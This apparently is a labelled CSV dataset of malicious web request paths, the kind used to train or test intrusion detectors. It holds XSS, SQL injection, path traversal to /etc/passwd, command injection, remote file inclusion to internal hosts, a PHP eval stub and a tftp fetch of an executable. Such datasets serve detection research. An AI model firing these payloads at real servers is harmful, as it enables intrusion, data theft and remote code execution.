payload,label
/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/..../boot.ini,1
/admin/doeditconfig.php?thispath=../includes&config[path]=http://192.168.202.118:8080/moclyxlwqyfjnp?,1
/examples/jsp/jsp2/jspx/starnet/addons/slideshow_full.php?album_name='2005084173,1
/javascript/benefits.exe,1
"/hrttz9fj.exe?<meta http-equiv=set-cookie content=""testtbjy=7334"">",1
/top.php?stuff=&ver\xa0>q92247843&rem\xa0,1
/scripts/kernel/loadkernel.php?installpath=/etc/passwd\x00,1
"/h21y8w52.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
ftp://192.168.24.253/*<apache_mod_proxy_ftp_glob_xss.nasl>,1
"/l752x1ry.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/search.jsp?q=%""<script>alert(1331909235)</script>",1
/www/delivery/ac.php?bannerid=-1332009302+or+1=1+--+';passthru(base64_decode($_server[http_nessus_dllvu4k6]));die;/*,1
"/en-us/account/index.php?id='union/**/select/**/0,0,1647791366,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/examples/servlets/servlet/includes/converter.inc.php?include_path=/etc/passwd\x00,1
/help.php?q='sleep 8 #,1
"/iktok2bw.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/~ftp.exe,1
/sprotectlinux/showpage.cgi?page=../html/splx_main.htm,1
"/help.php?q=""&ping -w 8000 -n 1 1.2.3.4&rem ",1
"/emailfriend/emailarticle.php?id=\""<script>alert(document.cookie)</script>",1
/javascript/document.bat,1
/static//\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xaeetc/passwd,1
"/6dlc2zm9.do?<script>document.cookie=""testqpux=4016;""</script>",1
/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331919174')</script>,1
/ju0u7kfo.jsp?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/security/protected/j_security_check;jsessionid=5680ad1b9956cf0a8a9f08a20f983ee6~,1
"<script>document.cookie=""testjvvf=7721;""</script>",1
"/egaet53a.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/top.php?stuff=ver;>q99348313&rem;,1
/recordings/pmwiki.php?globals[farmd]=/etc/passwd\x00,1
/examples/jsp/error/pfdispaly.cgi?../../../../../../etc/passwd,1
/bin/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
"/ewc3rz1l.idc?<meta http-equiv=set-cookie content=""testkgqo=204"">",1
"/en-us/dda2qr7j.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/m4kkjf8l.asp?<script>document.cookie=""testyglc=8988;""</script>",1
/mpcgi/ion-p?page=../../../../../etc/passwd,1
/examples/jsp/checkbox/index.php?cat=',1
"/h4bi26jd.aspx?<script>document.cookie=""testhrzx=1150;""</script>",1
/examples/jsp/colors/add_url.htm?node=<script>alert('xss')</script>,1
/subscriptions.jpg,1
"/t578vqea.htm?<script>document.cookie=""testsory=7676;""</script>",1
/examples/jsp/error/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd,1
/javascript/htpasswd.py,1
/scripts/index.php?board=nonexistant674192050,1
/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\x00,1
/top.php?stuff=ver\x0b>q75783184&rem\x0b,1
/scripts/9pen4xzgztjn.sh,1
/examples/jsp/checkbox/index.php?id=0rop9yeuxw',1
/examples/jsp/jsp2/jspx/al_initialize.php?alpath=/etc/passwd\x00,1
/d5a5renl.kspx?<script>cross_site_scripting.nasl</script>,1
/y8pmygrp.htm?<script>cross_site_scripting.nasl</script>,1
/javascript/pubs.exe,1
"/help.php?q=""&rm\x09q57946156\x09#",1
"/en-us/hipkz026.php?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
/scripts/1hactwocbsuo.cfm,1
/main.php?logout=\x0auname\x09>q18697999\x09#,1
/scripts/servubrowse.asp,1
/javascript/submit.exe,1
"/help.php?q=""ver\x09>q14739543&rem\x09",1
/cgis/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|',1
/p043snfr.php3?<script>cross_site_scripting.nasl</script>,1
/scripts/vzdybnanqpc3.php,1
"/i686v90l.cfc?<script>document.cookie=""testfutf=1550;""</script>",1
//../../../../../../../../etc/passwd\x00,1
/cgis/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
"/hrttz9fj.fts?<script>document.cookie=""testtbjy=7334;""</script>",1
/cgi-bin/showproduct.php?product=1',1
/bb000001.pl<script>alert('vulnerable')</script>,1
/examples/jsp/jsp2/jspx/config.php?returnpath=/etc/passwd\x00,1
"/i7prbs22.cgi?<script>document.cookie=""testjnre=7328;""</script>",1
/cacti/btdownload.php?type=torrent&file=../../../../../../../../../../etc/passwd,1
/examples/jsp/jsp2/jspx/index.php?action=view&filename=../../../../../../../../../../../../../etc/passwd,1
/help.php?q='\x0auname\x09>q12762848\x09#,1
/cacti/cal_week.php?op=week&catview=999',1
/apps/pbcs.dll/misc?url=../../../../../../../../../../../../boot.ini,1
messagedetail.asp?msg_id=',1
"/um7xpn15.mscgi?<script>document.cookie=""testotoy=6142;""</script>",1
"/main.php?logout=""|ping -w 9000 -n 1 4.3.2.1|rem ",1
/scripts/zq9frlz6fcfp.php,1
/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd,1
"/0z575z74.htm?<script>document.cookie=""testuhsv=9753;""</script>",1
/recordings/logbook.pl?file=../../../../../../../../../../bin/cat /etc/passwd\x00|,1
/cgi-bin/guestbook/passwd,1
"/8x6w469u.kspx?<script>document.cookie=""testgfjr=1286;""</script>",1
/kerkhoffs'_law/,1
/javascript/document.msg,1
"/i686v90l.kspx?<meta http-equiv=set-cookie content=""testfutf=1550"">",1
/javascript/replicated.exe,1
"/3j8echh0.html?<meta http-equiv=set-cookie content=""testfuqi=4189"">",1
/examples/servlets/servlet/rss.php?blogid=1&profile=../../config/config.properties.php\x00,1
/scripts/zq9frlz6fcfp.cfm,1
/cacti/calendar.php?serverpath=/etc/passwd\x00,1
/cgibin/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go,1
"/main.php?stuff=""ver\xa0>q63696925&rem\xa0",1
/phpnuke/html/.php?name=network_tools&file=index&func=ping_host&hinput=;id,1
/recordings/shoutbox.php?conf=../,1
/demos/demo.browse.php?filename=/etc/passwd,1
"/<script>document.cookie=""testvowq=604;""</script>",1
"/fpnpp5zg.pl?<meta http-equiv=set-cookie content=""testyias=101"">",1
/scripts/weigh_keywords.php?etcdir=http://cirt.net/rfiinc.txt?,1
"/j4rdyhw8.php?<script>document.cookie=""testrluj=1420;""</script>",1
"/help.php?q="";uname >q49727674 #",1
/main.php?logout=/',1
/main.php<?eval($_post['q54461335']);?eval($_post['q54461335']);?>,1
/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 412834017--,1
"/s7qus4g3.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/script_saved/,1
/comments.php?scriptpath=http://192.168.202.96:8080/frznctvhi0i5??,1
/index.php?page=../../../../../../../../../../../../../../../../../winnt/system32/ipconfig.exe,1
/m2fpztty.pl?<script>cross_site_scripting.nasl</script>,1
/phpmyadmin/index.php?string=',1
"/tuwjta1w.htm?<script>document.cookie=""testpokn=7494;""</script>",1
"/cleartrust/ct_logon.asp?ctauthmode=basic&ctloginerrormsg=xx&ct_orig_uri=\"">< script>alert(1)/script><\""",1
/cgi-915/ppdscgi.exe,1
"/main.php?logout=""ping;-w;10000;-n;1;4.3.2.1&rem;",1
/javascript/nude.exe,1
/y8pmygrp.do?<script>cross_site_scripting.nasl</script>,1
/scripts/counter.exe,1
"/vac1l5vm.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/ybz5rz7a.php?<script>document.cookie=""testsbvw=6289;""</script>",1
/examples/jsp/jsp2/jspx/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html,1
/javascript/htpasswd.rhtml,1
"/ju0u7kfo.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/cal/misc/audio.php?recording=../version.inc,1
/grid_subscriptions2/,1
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=lnu3g9zkqrlule9mw,1
/examples/jsp/colors/hw3.cgi?daysonly=0).system('id').(,1
"/eei78ore.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
../../../../../../../../../../../../etc/passwd,1
"/<meta http-equiv=set-cookie content=""testsixi=8451"">",1
/javascript/hp.exe,1
"/qhvu0pdg.php?<script>document.cookie=""testchuc=2100;""</script>",1
/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd\x00html&cart_id=,1
/main.php?logout=';uname >q89385457 #,1
/scripts/ggvfa_wichxq.asp,1
/eei78ore.php?<script>cross_site_scripting.nasl</script>,1
/javascript/.passwd.dll,1
/src/scripture.php?pageheaderfile=@rfiurl?pageheaderfile=@rfiurl?,1
"/securecgi-bin/csusercgi.exe?help+00.abcd.e.fghijk""""""><script>alert(""""""xss"""""")</script>",1
"/index.php?config[""sipssys""]=http://192.168.202.118:8080/moclyxlwqyfjnp?",1
/javascript/pc.exe,1
http://xxxxxxxxxxx.:80/<script>alert('vulnerable')</script>.cfm,1
"<meta http-equiv=set-cookie content=""testjvvf=7721"">",1
/cgi-perl/fileseek2.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=,1
/nsn/..\util/ren.bas,1
/examples/servlets/servlet/faxsurvey?cat /etc/passwd,1
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('/./tmp/fetpkvinrp.sh+>+/dev/null+&').""]=1",1
"/en-us/jnv890lt.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/save.php?file_save=/etc/passwd,1
"/phpmyadmin/notify?from=nessus""|id""",1
"/examples/jsp/error/index.php?op=default&date=200607' union select 1,1200541698,1,1,1,1,1,1,1,1--&blogid=1",1
"/help.php?q=""ping;-w;11000;-n;1;4.3.2.1&rem;",1
/scripts/zdbyw3dn3gh2.html,1
"/q703m78q.kspx?<script>document.cookie=""testvowq=604;""</script>",1
"/main.php?stuff=""&ver;>q22147997&rem;",1
"/help.php?q=""|ping\xa0-w\xa09000\xa0-n\xa01\xa04.3.2.1|rem\xa0",1
/script/tick/allincludefortick.php?path_to_code=http://192.168.202.118:8080/zz5thkvtmlgl?,1
"/v3axg1p8.cfm?<meta http-equiv=set-cookie content=""testxagh=6987"">",1
"/p043snfr.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/main.php?logout=""|ping;-w;11000;-n;1;1.2.3.4|rem;",1
/javascript/stored.exe,1
/launch.asp?nfuse_application=<script>alert('vulnerable')</script>,1
"/cacti/dsweb/services/user-1""><body onload=alert('xerox_docushare_dsweb_xss.nasl')>",1
"/p043snfr.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/xfkun1ku.htm?<script>cross_site_scripting.nasl</script>,1
"/ghswfouu.cfm?<script>document.cookie=""testsqmm=5713;""</script>",1
"/top.php?stuff=""rm\x09q12423295&rem\x09",1
/main.php?stuff=&uname >q17531529 #,1
"/h5sc3gxy.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/reference.exe,1
"/interface/login/login_frame.php?site=""><!--#exec cmd=""dir \""--><",1
/scripts/vzdybnanqpc3.asp,1
"/main.php?stuff=""&sleep\x099\x09#",1
"/en-us/oie504mr.php3?<script>document.cookie=""testtpby=7052;""</script>",1
/scripts/k0pxpjgnimox.cfm,1
/de3v2dd9.aspx?<script>cross_site_scripting.nasl</script>,1
"<meta http-equiv=set-cookie content=""testabrn=6368"">",1
"/x7pclv4s.kspx?<meta http-equiv=set-cookie content=""testiulz=3709"">",1
/scripts/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd\x00html,1
/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331918976&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
/fnwhrxyd.htm?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/sessions/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script,1
/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>,1
/examples/servlets/servlet/index.php?lng=../system_footer&sensor_program=phpsysinfo_241.nasl,1
"/bxnyrhmh.aspx?<meta http-equiv=set-cookie content=""testmjct=1867"">",1
/scripts/misc/info.php,1
"/ybz5rz7a.html?<script>document.cookie=""testsbvw=6289;""</script>",1
"<script>document.cookie=""testbnli=1975;""</script>",1
"/help.php?q=""&ping\x09-w\x098000\x09-n\x091\x094.3.2.1&rem\x09",1
"/<meta http-equiv=set-cookie content=""testxagh=6987"">",1
"/main.php?stuff=""rm q23955852 #",1
/scripts/ubbthreads.php,1
"/azcrfs8d.jspa?<meta http-equiv=set-cookie content=""testjpdr=9205"">",1
"/examples/servlets/servlet/?""><script>alert('struts_sa_surl_xss.nasl')</script>",1
/b5xdqgz2.cgi?<script>cross_site_scripting.nasl</script>,1
"/169okeyj.mscgi?<script>document.cookie=""testxeoi=3573;""</script>",1
/scripts/axdgpyi2bn6f.php,1
/scripts/msmmask.exe?mask=/nessus312940811.asp,1
/recordings/admin.php?style=../../../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/checkbox/index.php?templates_dir=/etc/passwd\x00,1
/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1332010394')</script>,1
/javascript/message.exe,1
/scripts/d3z7yywpyeoa.pl,1
"/top.php?stuff=""&ver&rem ",1
/examples/servlets/servlet/resetpw.php?email=../../../../../../../../../../../../etc/passwd,1
/javascript/solved.exe,1
"/index.php?action=search&searchfor=\""><script>alert('vulnerable')</script >",1
"/main.php?stuff=""&ver;>q86839174&rem;",1
"/oie504mr.nsf?<script>document.cookie=""testtpby=7052;""</script>",1
"/nyvbv05h.cgi?<script>document.cookie=""testftxz=5980;""</script>",1
/javascript/dbmodules.exe,1
"/mail.php?id='/**/union/**/select/**/1,2,1331919224,4--&blog=1",1
/examples/jsp/cal/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html,1
"/fpnpp5zg.asp?<script>document.cookie=""testyias=101;""</script>",1
ftp://192.168.28.202/*<apache_mod_proxy_ftp_glob_xss.nasl>,1
/raanw4ia.mscgi?<script>cross_site_scripting.nasl</script>,1
/cgibin/fileseek2.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd,1
/scripts/k0pxpjgnimox.shtml,1
"/h5i6crm3.mscgi?<meta http-equiv=set-cookie content=""testlihk=7070"">",1
"/hipkz026.php?<script>document.cookie=""testyrbs=2855;""</script>",1
"/6n7aacgg.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/num/demos/demo.browse.php?filename=/etc/passwd,1
"/jnt3f86c.htm?<meta http-equiv=set-cookie content=""testcmax=9270"">",1
/help.php?q=uname\x09>q77267797\x09#,1
/bin/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\,1
/javascript/ppt.exe,1
"/dda2qr7j.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/j2kdmfw4.cfc?<script>cross_site_scripting.nasl</script>,1
"/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331918993',null,null,null,null --",1
/examples/jsp/jsp2/jspx/index.php?user_langue=../../../../../../../../../../etc/passwd,1
/0rufe52p.php3?<script>cross_site_scripting.nasl</script>,1
/static//..\..\..\..\..\..\..\..\etc/passwd,1
/cgi-915/a1stats/a1disp3.cgi?../../../../../../../etc/passwd,1
"/main.php?stuff=""ping,-w,9000,-n,1,4.3.2.1&rem,",1
/_vti_bin/shtml.exe,1
"/help.php?q=""rm\x0cq43711515&rem\x0c",1
"/main.php?stuff="";rm\x09q18442351\x09#",1
/cgi-bin/..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
"/main.php?stuff=""ping -w 10000 -n 1 4.3.2.1&rem ",1
"/nuh3zirz.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/bin/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|,1
"/o6ebbirj.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/cal/viewcvs.cgi/?cvsroot=<script>foo</script>,1
/javascript/~log.exe,1
"/cgi-bin/index.php?op=default&date=200607' union select 1,1192121872,1,1,1,1,1,1,1,1--&blogid=1",1
"/cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904240','5'--",1
/script/plugins/phpgacl/admin/index.php?path_inc=http://192.168.202.118:8080/zz5thkvtmlgl?,1
"/phpmyadmin/documentation.html?'""=1",1
/index.php?cid=',1
/cacti/nucleus/libs/pluginadmin.php?globals[dir_libs]=/etc/passwd\x00,1
/examples/jsp/sessions/sawmill6cl.exe?ho+{complete_version},1
"/apavxugx.jsp?<script>document.cookie=""testdnbh=5237;""</script>",1
/javascript/pool.exe,1
/examples/jsp/num/index.php?_language=../../../../../../../../../../etc/passwd\x00,1
"/aj3pf49c.cfm?<script>document.cookie=""testnofv=4170;""</script>",1
"/main.php?logout=""&ping,-w,11000,-n,1,4.3.2.1&rem,",1
/imp/mailbox.php3?actionid=6&server=x&imapuser=x';somesql+--&pass=x,1
/scripts/weigh_keywords.php?etcdir=http://192.168.202.96:8080/4dckqcc0acprbz?,1
"/9ko6m4c8.php3?<meta http-equiv=set-cookie content=""testylik=3403"">",1
"/scripts/index.php?id='union/**/select/**/0,0,521532225,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
"/top.php?stuff=""&del q85387982 #",1
/javascript/.passwd.csproj,1
/javascript/catalogs.exe,1
"/jdx255ea.cfc?<meta http-equiv=set-cookie content=""testziyq=5055"">",1
/recordings/phf?qalias=x\x0a/bin/cat /etc/passwd,1
/examples/jsp/num/popup.php?include_path=/etc/passwd\x00,1
"/top.php?stuff=""\x0asleep\x097\x09#",1
"/scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331905123',null,null,null,null --",1
"/en-us/9kr0ih0v.asp?<script>document.cookie=""testzgnm=1183;""</script>",1
/javascript/running.exe,1
/cgi-bin/home/search.asp?nchannel='1,1
"/main.php?logout=""del q21367835&rem ",1
/cgi-bin/..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
/rv98iwjp.htm?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd,1
/phpmyadmin/documentation.html?phpmyadmin=/etc/passwd,1
/examples/jsp/error/calendar_admin.pl?config=|cat /etc/passwd|,1
/scripts/ck8pj.exe?/x+/c+tftp -i 192.168.202.118 get durjhxa1 qowmcdks.exe,1
/phpmyadmin/documentation.html?phpmyadmin=|cat /etc/passwd|,1
/main.php?logout='del\x09q76232693\x09#,1
/examples/jsp/num/install.php?newlang=../../cpg_error.log\x00,1
/javascript/closing.exe,1
/javascript/monitoring.exe,1
"/en-us/fo564rei.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/prescription010507/,1
"/if69ddo1.nsf?<meta http-equiv=set-cookie content=""testiabz=5220"">",1
/javascript/roaming.exe,1
"/6qbynt4f.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/jnv890lt.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/6qbynt4f.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/3hlysl2x.pl?<meta http-equiv=set-cookie content=""testgjbe=8505"">",1
"/main.php?logout=""ping;-w;11000;-n;1;4.3.2.1&rem;",1
/examples/jsp/cal/calendar_admin.pl?config=|cat /etc/passwd|,1
"/cgi-bin/search.jsp?q=%""<script>alert(1332008604)</script>",1
/rtph263dumpscript/,1
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=10nbpndw5e2ir1ncx,1
/cgi-bin/mlog.html?screen=/etc/passwd,1
"/main.php?stuff=""&ping\x09-w\x098000\x09-n\x091\x091.2.3.4&rem\x09",1
/examples/jsp/jsp2/jspx/cal_make.pl?p0=../../../../../../../../../etc/passwd\x00,1
"/zroo33l4.php?<meta http-equiv=set-cookie content=""testiklc=904"">",1
/top.php?stuff='\x0asleep\x097\x09#,1
"/scs86g1p.cfc?<script>document.cookie=""testquyx=2820;""</script>",1
/d5a5renl.html?<script>cross_site_scripting.nasl</script>,1
/scripts/mapserv?map=mapserver_detect.nasl.map,1
/javascript/corporate.exe,1
/phpmyadmin/index.php?chemin=../../../../../../..//etc,1
/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>,1
"/ju0u7kfo.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/shoutbox/expanded.php?conf=../../../../../../../etc/passwd ,1
"/help.php?q=""rm\x09q12928131\x09#",1
/en-us/account/more.php?id=1',1
/examples/servlets/servlet/forum_2.php?msg=10&return=<script>foo</script>,1
/m2fpztty.idc?<script>cross_site_scripting.nasl</script>,1
"/l13b77e5.htm?<script>document.cookie=""testjvvf=7721;""</script>",1
/javascript/.passwd.stackdump,1
/examples/jsp/num/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x,1
/javascript/code.exe,1
"/manager/activatemember?activatecode=&member=""><script>alert('mvnforum_activatemember_xss.nasl')</script>",1
"/o1zj4u9v.asp?<meta http-equiv=set-cookie content=""testabrn=6368"">",1
/help.php?q='\x0auname #,1
/javascript/hit.exe,1
"/main.php?stuff=""ping\x09-w\x0910000\x09-n\x091\x091.2.3.4|rem\x09",1
/subscriptions.doc,1
/include/scripts/run_auto_suspend.cron.php?dir=@rfiurl,1
/nyjgaorz.kspx?<script>cross_site_scripting.nasl</script>,1
"<meta http-equiv=set-cookie content=""testrluj=1420"">",1
"/bugs/forgot_password.php?email=\""><script>alert(document.cookie)</script>",1
